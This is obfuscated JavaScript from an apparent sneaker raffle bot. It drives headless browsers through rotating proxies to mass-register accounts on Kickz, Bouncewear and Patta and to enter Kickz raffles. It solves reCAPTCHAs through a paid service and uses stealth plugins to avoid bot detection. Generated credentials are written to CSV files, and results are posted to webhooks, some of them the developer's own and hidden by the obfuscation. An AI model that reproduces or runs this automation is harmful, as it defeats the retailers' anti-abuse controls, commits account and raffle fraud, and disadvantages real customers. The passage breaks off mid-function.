async function _0x2dd9c5(_0x3eaf85, _0x18047b, _0x14e760, _0x3d1c95) {
    _0x3102e9['use'](_0x5c5e7a()), _0x3102e9['use'](_0x45477b({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x13b92f['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x5e5b79 = 0x0; _0x5e5b79 < _0x14e760['length']; _0x5e5b79++) {
        var _0xffe561 = '', _0x43f143 = 0x0;
        _0x4bc62a(_0x18047b['name'] + '\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20/\x20' + _0x14e760['length'] + '\x20||\x20File:\x20' + _0x5ece83 + '\x20Proxies:\x20' + _0x286bb6), await _0x423f7e(_0x14e760, _0x5e5b79);
        var _0x564577 = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x17ac6d
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x13b92f['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x520c59
                }
            ]
        }];
        const _0x42a71d = { 'embeds': _0x564577 };
        var _0x4bc41d = await _0x83146(_0x14e760[_0x5e5b79], _0x18047b, 'acc', ![]);
        const _0x27ea3e = { 'succesDEVMSG': { 'embeds': [_0x4bc41d] } };
        if (_0x14e760[_0x5e5b79]['Email'] == '' || _0x14e760[_0x5e5b79]['FirstName'] == '' || _0x14e760[_0x5e5b79]['LastName'] == '') {
            console['log'](_0x19564e() + '\x20[' + _0x18047b['name'] + ']\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        _0x14e760[_0x5e5b79]['Password'] == '' && (_0x14e760[_0x5e5b79]['Password'] = 'JRaffles23!');
        if (_0x13b92f['useRandomProxy'] = ![])
            var _0x13a8d4 = _0x3d1c95[_0x5e5b79]['split'](':');
        else
            var _0x42260e = Math['round'](Math['random']() * (_0x3d1c95['length'] - 0x1)), _0x13a8d4 = _0x3d1c95[_0x42260e]['split'](':');
        const _0x3ad65c = await _0x3102e9['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x13a8d4[0x0] + ':' + _0x13a8d4[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x394dbe = await _0x3ad65c['newPage']();
            await _0x394dbe['authenticate']({
                'username': '' + _0x13a8d4[0x2],
                'password': '' + _0x13a8d4[0x3]
            }), console['log'](_0x19564e() + '\x20[' + _0x18047b['name'] + ']\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x394dbe['setRequestInterception'](!![]), _0x394dbe['on']('request', _0x3a084b => {
                _0x3a084b['resourceType']() === 'image' || _0x3a084b['resourceType']() === 'font' || _0x3a084b['resourceType']() === 'media' ? _0x3a084b['abort']() : _0x3a084b['continue']();
            }), await _0x394dbe['goto'](_0x3eaf85), await _0x19d76a(0xbb8), console['log'](_0x19564e() + '\x20[' + _0x18047b['name'] + ']\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x394dbe['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x394dbe['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x394dbe['waitForSelector']('#button-register'), await _0x19d76a(0x7d0), await _0x394dbe['evaluate'](() => {
                const _0x97c949 = document['querySelector']('#button-register');
                _0x97c949['click']();
            }), console['log'](_0x19564e() + '\x20[' + _0x18047b['name'] + ']\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x19d76a(0x1388), await _0x394dbe['waitForSelector']('#customer_salutation'), await _0x394dbe['select']('#customer_salutation', 'mr'), await _0x19d76a(0x7d0), await _0x394dbe['waitForSelector']('#customer_firstname'), await _0x394dbe['type']('#customer_firstname', '' + _0x14e760[_0x5e5b79]['FirstName']), await _0x19d76a(0x352), await _0x394dbe['waitForSelector']('#customer_lastname'), await _0x394dbe['type']('#customer_lastname', '' + _0x14e760[_0x5e5b79]['LastName']), await _0x19d76a(0x352), await _0x394dbe['type']('#email-input', '' + _0x14e760[_0x5e5b79]['Email']), await _0x19d76a(0x352), await _0x394dbe['type']('#email-confirm-input', '' + _0x14e760[_0x5e5b79]['Email']), await _0x19d76a(0x352), await _0x394dbe['type']('#register-password', '' + _0x14e760[_0x5e5b79]['Password']), await _0x19d76a(0x352), await _0x394dbe['type']('#password-confirm', '' + _0x14e760[_0x5e5b79]['Password']), await _0x19d76a(0x352), console['log'](_0x19564e() + '\x20[' + _0x18047b['name'] + ']\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x394dbe['click']('#consent'), await _0x19d76a(0x1f4);
            const _0x58bfcc = await _0x394dbe['$']('div.inputErrorMsg.b-form_section-message');
            if (_0x58bfcc) {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x18047b['name'] + ']\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                continue;
            }
            await _0x394dbe['click']('#buttonRegister');
            try {
                await _0x394dbe['waitForSelector']('#verificationCode');
            } catch {
                throw new Error('Account\x20already\x20registered');
            }
            console['log'](_0x304ca1['yellow'](_0x19564e() + '\x20[' + _0x18047b['name'] + ']\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20:\x20Account\x20' + _0x14e760[_0x5e5b79]['Email'] + '\x20Generated!')), console['log'](_0x304ca1['yellow'](_0x19564e() + '\x20[' + _0x18047b['name'] + ']\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x14e760[_0x5e5b79]['Email'])), await _0x19d76a(0x4b0);
            async function _0x2efc28() {
                console['log'](_0x304ca1['yellow'](_0x19564e() + '\x20[' + _0x18047b['name'] + ']\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20:\x20Paste\x20your\x20verification\x20code\x20here:'));
                var _0x1a29ec = await _0x124037['get']('Code');
                return _0x1a29ec['Code'];
            }
            ;
            code = await _0x2efc28(), _0x19d76a(0x320), console['log'](_0x19564e() + '\x20[' + _0x18047b['name'] + ']\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20:\x20Verifying..'), await _0x394dbe['type']('#verificationCode', code), await _0x19d76a(0x1f4), await _0x394dbe['click']('#buttonVerify'), await _0x19d76a(0x190), await _0x394dbe['click']('#buttonVerify'), await _0x19d76a(0x3e8);
            try {
                await _0x394dbe['waitForSelector']('div.b-user_greeting'), console['log'](_0x304ca1['green'](_0x19564e() + '\x20[' + _0x18047b['name'] + ']\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20:\x20Account\x20' + _0x14e760[_0x5e5b79]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x20c314['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x14e760[_0x5e5b79]['Email'] + ',' + _0x14e760[_0x5e5b79]['Password'] + ','), console['log'](_0x19564e() + '\x20[' + _0x18047b['name'] + ']\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20:\x20Account\x20' + _0x14e760[_0x5e5b79]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                try {
                    _0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '' && await _0xdeed(_0x13b92f['webhook'], _0x27ea3e['succesDEVMSG']);
                } catch {
                }
                await _0xdeed(_0x43652e, _0x27ea3e['succesDEVMSG']);
            } catch {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x18047b['name'] + ']\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x18047b['name'] + ']\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
            }
        } catch (_0x106017) {
            console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x18047b['name'] + ']\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20:\x20' + _0x106017)), _0x564577[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x564577[0x0]['description'] = '' + _0x106017, await _0xdeed(_0x192865, _0x42a71d), _0xffe561 = 'yes';
        } finally {
            _0x3ad65c && _0x3ad65c['close']();
            if (_0xffe561 == 'yes' && _0x43f143 != 0x5) {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x18047b['name'] + ']\x20Task\x20' + (_0x5e5b79 + 0x1) + '\x20:\x20Retrying')), _0x5e5b79 = _0x5e5b79 - 0x1, _0x43f143 = _0x43f143 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x13b92f['delay'] + '\x20ms'), await _0x19d76a(_0x13b92f['delay']);
        }
    }
}
async function _0x27a5fb(_0xf5b49f, _0x484e19, _0x2d97af) {
    _0x3102e9['use'](_0x5c5e7a()), _0x3102e9['use'](_0x45477b({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x13b92f['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4fb957 = 0x0; _0x4fb957 < _0x484e19['length']; _0x4fb957++) {
        var _0x32aec0, _0x14b012 = '', _0x47b164 = 0x0;
        _0x4bc62a(_0xf5b49f['name'] + '\x20Task\x20' + (_0x4fb957 + 0x1) + '\x20/\x20' + _0x484e19['length'] + '\x20||\x20File:\x20' + _0x5ece83 + '\x20Proxies:\x20' + _0x286bb6);
        var _0x4a2aff = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x17ac6d
                },
                {
                    'name': 'Product',
                    'value': '' + _0x484e19[_0x4fb957]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x484e19[_0x4fb957]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x13b92f['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x520c59
                }
            ]
        }], _0x103273 = await _0x83146(_0x484e19[_0x4fb957], _0xf5b49f, 'dev', ![]), _0x3225ff = await _0x83146(_0x484e19[_0x4fb957], _0xf5b49f, 'pub', ![]);
        const _0x239234 = {
            'succesDEVMSG': { 'embeds': [_0x103273] },
            'succesPUBMSG': { 'embeds': [_0x3225ff] }
        };
        await _0x423f7e(_0x484e19, _0x4fb957);
        if (_0x484e19[_0x4fb957]['Email'] == '' || _0x484e19[_0x4fb957]['Password'] == '' || _0x484e19[_0x4fb957]['FirstName'] == '' || _0x484e19[_0x4fb957]['LastName'] == '') {
            console['log'](_0x19564e() + '\x20[' + _0xf5b49f['name'] + ']\x20Task\x20' + (_0x4fb957 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x13b92f['useRandomProxy'] = ![])
            var _0x302a3c = _0x2d97af[_0x4fb957]['split'](':');
        else
            var _0x18f4a5 = Math['round'](Math['random']() * (_0x2d97af['length'] - 0x1)), _0x302a3c = _0x2d97af[_0x18f4a5]['split'](':');
        const _0x50f24b = await _0x3102e9['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x302a3c[0x0] + ':' + _0x302a3c[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x14babf = await _0x50f24b['newPage']();
            await _0x14babf['authenticate']({
                'username': '' + _0x302a3c[0x2],
                'password': '' + _0x302a3c[0x3]
            }), console['log'](_0x19564e() + '\x20[' + _0xf5b49f['name'] + ']\x20Task\x20' + (_0x4fb957 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x14babf['setRequestInterception'](!![]), _0x14babf['on']('request', _0x2ea449 => {
                _0x2ea449['resourceType']() === 'image' || _0x2ea449['resourceType']() === 'font' || _0x2ea449['resourceType']() === 'media' ? _0x2ea449['abort']() : _0x2ea449['continue']();
            }), await _0x14babf['goto']('' + _0x484e19[_0x4fb957]['Url'], { 'waitUntil': 'networkidle2' }), await _0x19d76a(0x12c);
            try {
                await _0x14babf['click']('a[title=\x22Sign\x20In\x22]');
            } catch {
                await _0x14babf['click']('a[title=\x22sign\x20in\x22]');
            }
            console['log'](_0x19564e() + '\x20[' + _0xf5b49f['name'] + ']\x20Task\x20' + (_0x4fb957 + 0x1) + '\x20:\x20Logging\x20in'), await _0x14babf['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x14babf['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x14babf['waitForSelector']('#username'), await _0x14babf['type']('#username', _0x484e19[_0x4fb957]['Email']), await _0x14babf['waitForSelector']('#password'), await _0x14babf['type']('#password', _0x484e19[_0x4fb957]['Password']), await _0x19d76a(0x190), await _0x14babf['click']('#buttonSubmit'), await _0x14babf['waitForSelector']('div.b-user_greeting'), console['log'](_0x19564e() + '\x20[' + _0xf5b49f['name'] + ']\x20Task\x20' + (_0x4fb957 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x19d76a(0x1f4), await _0x14babf['goto']('' + _0x484e19[_0x4fb957]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x19564e() + '\x20[' + _0xf5b49f['name'] + ']\x20Task\x20' + (_0x4fb957 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x484e19[_0x4fb957]['Size']);
            let _0x4caf82 = _0x484e19[_0x4fb957]['Size']['replace']('.5', '\x201/2');
            await _0x14babf['click']('button[title=\x22' + _0x4caf82 + '\x22]'), await _0x19d76a(0x1f4);
            try {
                await _0x14babf['click']('button[data-tau=\x22add_new_address\x22]');
            } catch {
            }
            await _0x19d76a(0x12c), console['log'](_0x19564e() + '\x20[' + _0xf5b49f['name'] + ']\x20Task\x20' + (_0x4fb957 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x14babf['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x19d76a(0x12c), await _0x14babf['type']('#dwfrm_raffle_addressFields_firstName', _0x484e19[_0x4fb957]['FirstName']), await _0x19d76a(0x12c), await _0x14babf['type']('#dwfrm_raffle_addressFields_lastName', _0x484e19[_0x4fb957]['LastName']), await _0x19d76a(0x12c), await _0x14babf['select']('#dwfrm_raffle_addressFields_country', _0x484e19[_0x4fb957]['Country']), await _0x19d76a(0x12c), await _0x14babf['type']('#dwfrm_raffle_addressFields_city', _0x484e19[_0x4fb957]['City']), await _0x19d76a(0x12c);
            _0x484e19[_0x4fb957]['Postcode'] == undefined && (_0x484e19[_0x4fb957]['Postcode'] = _0x484e19[_0x4fb957]['Zip']);
            await _0x14babf['type']('#dwfrm_raffle_addressFields_postalCode', _0x484e19[_0x4fb957]['Postcode']), await _0x19d76a(0x12c), await _0x14babf['type']('#dwfrm_raffle_addressFields_address1', _0x484e19[_0x4fb957]['Address1']), await _0x19d76a(0x12c), await _0x14babf['type']('#dwfrm_raffle_addressFields_address2', _0x484e19[_0x4fb957]['HouseNumber']), await _0x19d76a(0x12c), await _0x14babf['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x484e19[_0x4fb957]['Address2']), await _0x19d76a(0x12c), await _0x14babf['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x19d76a(0x12c), await _0x14babf['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x484e19[_0x4fb957]['Follower']), await _0x19d76a(0x1f4), await _0x14babf['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x19d76a(0x1f4), console['log'](_0x19564e() + '\x20[' + _0xf5b49f['name'] + ']\x20Task\x20' + (_0x4fb957 + 0x1) + '\x20:\x20' + _0x304ca1['blue']('Awaiting\x20Paypal\x20Payment')), await _0x14babf['click']('.b-paypal_button');
            try {
                await _0x14babf['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), console['log'](_0x304ca1['green'](_0x19564e() + '\x20[' + _0xf5b49f['name'] + ']\x20Task\x20' + (_0x4fb957 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '' && await _0xdeed(_0x13b92f['webhook'], _0x239234['succesDEVMSG']), await _0x19d76a(0xc8), await _0xdeed(_0x25855c, _0x239234['succesDEVMSG']), await _0x19d76a(0xc8), await _0xdeed(_0x4c8fbe, _0x239234['succesPUBMSG']);
            } catch (_0x4ffccc) {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0xf5b49f['name'] + ']\x20Task\x20' + (_0x4fb957 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x4ffccc)), _0x32aec0 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x4ffccc;
                var _0x1dd5b8 = await _0x83146(_0x484e19[_0x4fb957], _0xf5b49f, 'dev', !![], _0x32aec0);
                _0x239234['errorDEV'] = { 'embeds': [_0x1dd5b8] }, _0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '' && await _0xdeed(_0x13b92f['webhook'], _0x239234['errorDEV']), await _0xdeed(_0x192865, _0x239234['errorDEV']);
            }
        } catch (_0x57153e) {
            console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0xf5b49f['name'] + ']\x20Task\x20' + (_0x4fb957 + 0x1) + '\x20:\x20' + _0x57153e)), _0x32aec0 = '' + _0x57153e;
            var _0x1dd5b8 = await _0x83146(_0x484e19[_0x4fb957], _0xf5b49f, 'dev', !![], _0x32aec0);
            _0x239234['errorDEV'] = { 'embeds': [_0x1dd5b8] }, _0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '' && await _0xdeed(_0x13b92f['webhook'], _0x239234['errorDEV']), await _0xdeed(_0x192865, _0x239234['errorDEV']), _0x14b012 = 'yes';
        } finally {
            _0x50f24b && _0x50f24b['close']();
            if (_0x14b012 == 'yes' && _0x47b164 != 0x5) {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0xf5b49f['name'] + ']\x20Task\x20' + (_0x4fb957 + 0x1) + '\x20:\x20Retrying')), _0x4fb957 = _0x4fb957 - 0x1, _0x47b164 = _0x47b164 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x13b92f['AfewDelay'] + '\x20ms'), await _0x19d76a(_0x13b92f['AfewDelay']);
        }
    }
}
async function _0x535818(_0x4c2af4, _0x510663) {
    _0x3102e9['use'](_0x5c5e7a()), _0x3102e9['use'](_0x45477b({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x13b92f['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x28d67d = 0x0; _0x28d67d < bouncewear['length']; _0x28d67d++) {
        await _0x423f7e(bouncewear, _0x28d67d);
        if (bouncewear[_0x28d67d]['Email'] == '' || bouncewear[_0x28d67d]['Password'] == '' || bouncewear[_0x28d67d]['FirstName'] == '' || bouncewear[_0x28d67d]['LastName'] == '') {
            console['log'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x28d67d + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x13b92f['useRandomProxy'] = ![])
            var _0x1bcf0d = _0x427d5d()[_0x28d67d]['split'](':');
        else
            var _0x339e3f = Math['round'](Math['random']() * (_0x427d5d()['length'] - 0x1)), _0x1bcf0d = _0x427d5d()[_0x339e3f]['split'](':');
        const _0x4dec41 = await _0x3102e9['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x1bcf0d[0x0] + ':' + _0x1bcf0d[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x34c733 = await _0x4dec41['newPage']();
            await _0x34c733['authenticate']({
                'username': '' + _0x1bcf0d[0x2],
                'password': '' + _0x1bcf0d[0x3]
            }), console['log'](_0x19564e() + '\x20[' + _0x510663['name'] + ']\x20Task\x20' + (_0x28d67d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x34c733['setRequestInterception'](!![]), _0x34c733['on']('request', _0x8c2eee => {
                _0x8c2eee['resourceType']() === 'image' || _0x8c2eee['resourceType']() === 'font' || _0x8c2eee['resourceType']() === 'media' ? _0x8c2eee['abort']() : _0x8c2eee['continue']();
            }), await _0x34c733['goto'](_0x4c2af4), await _0x19d76a(0xbb8), await _0x34c733['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x19564e() + '\x20[' + _0x510663['name'] + ']\x20Task\x20' + (_0x28d67d + 0x1) + '\x20:\x20Filling\x20information'), await _0x34c733['type']('#RegisterForm-FirstName', '' + bouncewear[_0x28d67d]['FirstName']), await _0x19d76a(0x226), await _0x34c733['type']('#RegisterForm-LastName', '' + bouncewear[_0x28d67d]['LastName']), await _0x19d76a(0x226), await _0x34c733['type']('#RegisterForm-email', '' + bouncewear[_0x28d67d]['Email']), await _0x19d76a(0x226), await _0x34c733['type']('#RegisterForm-password', '' + bouncewear[_0x28d67d]['Password']), await _0x19d76a(0x226), await _0x34c733['click']('#marketing'), console['log'](_0x19564e() + '\x20[' + _0x510663['name'] + ']\x20Task\x20' + (_0x28d67d + 0x1) + '\x20:\x20Submitting..'), await _0x34c733['$eval']('#RegisterForm', _0x3d65ee => _0x3d65ee['submit']()), await _0x19d76a(0x1f40), console['log'](_0x19564e() + '\x20[' + _0x510663['name'] + ']\x20Task\x20' + (_0x28d67d + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x34c733['solveRecaptchas'](), await _0x34c733['click']('.shopify-challenge__button.btn');
            async function _0x441082() {
                for (var _0x1c88ad = 0x0; _0x1c88ad < 0x4; _0x1c88ad++) {
                    try {
                        console['log']('try'), await _0x34c733['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x19564e() + '\x20[' + _0x510663['name'] + ']\x20Task\x20' + (_0x28d67d + 0x1) + '\x20:\x20' + _0x304ca1['red']('Catpcha\x20failed,\x20retrying..')), await _0x34c733['solveRecaptchas'](), await _0x34c733['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x441082(), console['log'](_0x19564e() + '\x20[' + _0x510663['name'] + ']\x20Task\x20' + (_0x28d67d + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x19d76a(0x1f4);
            try {
                await _0x34c733['waitForSelector']('.featured-title'), await _0x19d76a(0x1f4), console['log'](_0x304ca1['green'](_0x19564e() + '\x20[' + _0x510663['name'] + ']\x20Task\x20' + (_0x28d67d + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x28d67d]['Email'] + '\x20Generated!')), _0x20c314['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x28d67d]['Email'] + ',' + bouncewear[_0x28d67d]['Password']), console['log'](_0x304ca1['yellow'](_0x19564e() + '\x20[' + _0x510663['name'] + ']\x20Task\x20' + (_0x28d67d + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x28d67d]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x193bdb) {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x28d67d + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x193bdb));
            }
        } catch (_0x5a2e74) {
            console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x28d67d + 0x1) + '\x20:\x20' + _0x5a2e74));
        } finally {
            _0x4dec41 && _0x4dec41['close'](), console['log']('Waiting\x20for\x20' + _0x13b92f['delay'] + '\x20ms'), await _0x19d76a(_0x13b92f['delay']);
        }
    }
}
async function _0x3d389f(_0x43807c, _0x87860c, _0x5cb150, _0x51e7d3) {
    _0x3102e9['use'](_0x5c5e7a()), _0x3102e9['use'](_0x45477b({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x13b92f['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1b0770 = 0x0; _0x1b0770 < _0x5cb150['length']; _0x1b0770++) {
        var _0xea07c = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x17ac6d
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x13b92f['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x520c59
                }
            ]
        }];
        const _0x4d0f19 = { 'embeds': _0xea07c };
        _0x4bc62a(_0x87860c['name'] + '\x20Task\x20' + (_0x1b0770 + 0x1) + '\x20/\x20' + _0x5cb150['length'] + '\x20||\x20File:\x20' + _0x5ece83 + '\x20Proxies:\x20' + _0x286bb6), await _0x423f7e(_0x5cb150, _0x1b0770);
        var _0x139089 = await _0x83146(_0x5cb150[_0x1b0770], _0x87860c, 'acc', ![]);
        const _0x41658b = { 'succesDEVMSG': { 'embeds': [_0x139089] } };
        if (_0x5cb150[_0x1b0770]['Email'] == '' || _0x5cb150[_0x1b0770]['FirstName'] == '' || _0x5cb150[_0x1b0770]['LastName'] == '') {
            console['log'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x1b0770 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x19d76a(0x7d0);
            continue;
        }
        (_0x5cb150[_0x1b0770]['Password'] == '' || _0x5cb150[_0x1b0770] == undefined) && _0x5cb150[_0x1b0770]['Password'] == 'JRaffles23!';
        if (_0x13b92f['useRandomProxy'] = ![])
            var _0x421696 = _0x51e7d3[_0x1b0770]['split'](':');
        else
            var _0x56a763 = Math['round'](Math['random']() * (_0x51e7d3['length'] - 0x1)), _0x421696 = _0x51e7d3[_0x56a763]['split'](':');
        const _0x1dc2d7 = await _0x3102e9['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x421696[0x0] + ':' + _0x421696[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x32b3c6 = await _0x1dc2d7['newPage']();
            await _0x32b3c6['authenticate']({
                'username': '' + _0x421696[0x2],
                'password': '' + _0x421696[0x3]
            }), console['log'](_0x19564e() + '\x20[' + _0x87860c['name'] + ']\x20Task\x20' + (_0x1b0770 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x32b3c6['setRequestInterception'](!![]), _0x32b3c6['on']('request', _0x2f9148 => {
                _0x2f9148['resourceType']() === 'image' || _0x2f9148['resourceType']() === 'font' || _0x2f9148['resourceType']() === 'media' ? _0x2f9148['abort']() : _0x2f9148['continue']();
            }), await _0x32b3c6['goto'](_0x43807c), await _0x19d76a(0xbb8), await _0x32b3c6['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x19564e() + '\x20[' + _0x87860c['name'] + ']\x20Task\x20' + (_0x1b0770 + 0x1) + '\x20:\x20Filling\x20information'), await _0x32b3c6['type']('#RegisterForm-FirstName', '' + _0x5cb150[_0x1b0770]['FirstName']), await _0x19d76a(0x226), await _0x32b3c6['type']('#RegisterForm-LastName', '' + _0x5cb150[_0x1b0770]['LastName']), await _0x19d76a(0x226), await _0x32b3c6['type']('#RegisterForm-email', '' + _0x5cb150[_0x1b0770]['Email']), await _0x19d76a(0x226), await _0x32b3c6['type']('#RegisterForm-password', '' + _0x5cb150[_0x1b0770]['Password']), await _0x19d76a(0x226), console['log'](_0x19564e() + '\x20[' + _0x87860c['name'] + ']\x20Task\x20' + (_0x1b0770 + 0x1) + '\x20:\x20Submitting..'), await _0x32b3c6['$eval']('#RegisterForm', _0x4260d6 => _0x4260d6['submit']()), await _0x19d76a(0x1f40);
            try {
                await _0x32b3c6['waitForSelector']('.home-page-grid__collection'), await _0x19d76a(0x1f4), console['log'](_0x304ca1['green'](_0x19564e() + '\x20[' + _0x87860c['name'] + ']\x20Task\x20' + (_0x1b0770 + 0x1) + '\x20:\x20Account\x20' + _0x5cb150[_0x1b0770]['Email'] + '\x20Generated!')), _0x20c314['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x5cb150[_0x1b0770]['Email'] + ',' + _0x5cb150[_0x1b0770]['Password']), console['log'](_0x304ca1['yellow'](_0x19564e() + '\x20[' + _0x87860c['name'] + ']\x20Task\x20' + (_0x1b0770 + 0x1) + '\x20:\x20Account\x20' + _0x5cb150[_0x1b0770]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                try {
                    _0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '' && await _0xdeed(_0x13b92f['webhook'], _0x41658b['succesDEVMSG']);
                } catch {
                }
                await _0xdeed(_0x43652e, _0x41658b['succesDEVMSG']);
            } catch (_0x5579d1) {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x1b0770 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x5579d1));
            }
        } catch (_0x5ac088) {
            console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Task\x20' + (_0x1b0770 + 0x1) + '\x20:\x20' + _0x5ac088));
        } finally {
            _0x1dc2d7 && _0x1dc2d7['close'](), console['log']('Waiting\x20for\x20' + _0x13b92f['delay'] + '\x20ms'), await _0x19d76a(_0x13b92f['delay']);
        }
    }
}
async function _0x4bcee3(_0x32c91c, _0x17d36, _0x5654b8, _0x2540cf) {
    _0x3102e9['use'](_0x5c5e7a()), _0x3102e9['use'](_0x45477b({
        'provider': {
            'id': '2captcha',
